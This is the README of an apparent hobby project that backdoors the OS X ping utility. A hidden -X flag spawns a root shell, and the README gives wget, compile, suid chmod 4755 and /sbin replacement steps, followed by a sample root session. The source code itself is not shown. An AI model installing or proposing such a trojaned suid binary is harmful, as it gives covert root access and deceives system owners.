OS X Backdoored ping
====================

This is just the normal OS X `ping`, but if you run it with the flag `-X`, it drops a root shell.  This relies on the `suid` bit being set, it's not an exploit and it won't help you root a server (which you shouldn't be doing anyway 😠).

I didn't write the `ping` utility, this is just the normal OS X `ping`, the source code of which can be found [here](http://www.opensource.apple.com/source/network_cmds/network_cmds-329.2/ping.tproj/ping.c?txt). All I did was add the `-X` flag and the function `r00t()`.

This program still works like the normal `ping`. It just has a little secret 😉

# Compilation & Installation

1. `wget https://raw.githubusercontent.com/raincoats/osx-ping-backdoor/master/ping.c`
1. `gcc ping.c -o ping`
2. `chown root:wheel ./ping; chmod 4755 ./ping`
3. Optionally, `mv /sbin/ping{,-backup} && mv ./ping /sbin` (but I mean, really, are you sure you want a backdoor on your smackbook throw?)

# Usage

    $ ./ping -X
       .----------------.
       |_I_I_I_I_I_I_I_I]___
       |  _    r00t! : ; _  )
      ='-(_)----------=-(_)-'
    sh-3.2# whoami
    root
    sh-3.2#

# Why did you even bother

This is me attempting to learn a little C. Even though I didn't do much, I'm stoked that it compiles & works. So if you don't like it buzz off 🐝🐝🐝🐝
